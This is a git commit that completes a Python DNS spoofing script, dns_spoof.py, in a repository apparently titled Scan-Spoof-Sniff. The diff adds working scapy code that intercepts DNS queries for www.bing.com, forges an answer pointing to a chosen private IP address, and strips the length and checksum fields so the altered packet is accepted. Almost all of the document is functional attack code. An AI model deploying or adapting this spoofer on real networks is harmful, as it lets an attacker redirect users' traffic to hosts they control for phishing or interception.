14822f345018e74d41a9ab2a669876af90eb4502
elwali10 <walikarkoub@gmail.com>
2019-07-06 13:26:16 -0400

    dns spoof completed

--- Scan-Spoof-Sniff/dns_spoof.py
+++ Scan-Spoof-Sniff/dns_spoof.py
@@ -10,7 +10,17 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.100")
+            answer = scapy.DNSRR(rrname=qname, rdata="172.16.175.129")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
     
     packet.accept()
 
